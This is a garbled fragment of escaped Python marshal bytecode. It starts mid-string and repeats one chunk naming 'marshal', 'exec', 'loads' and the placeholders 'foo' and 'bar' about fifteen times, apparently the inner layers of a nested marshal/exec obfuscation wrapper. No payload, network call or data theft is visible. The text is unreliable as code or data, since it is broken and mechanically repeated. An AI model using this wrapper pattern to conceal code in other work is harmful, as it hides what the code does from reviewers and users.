07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01'))
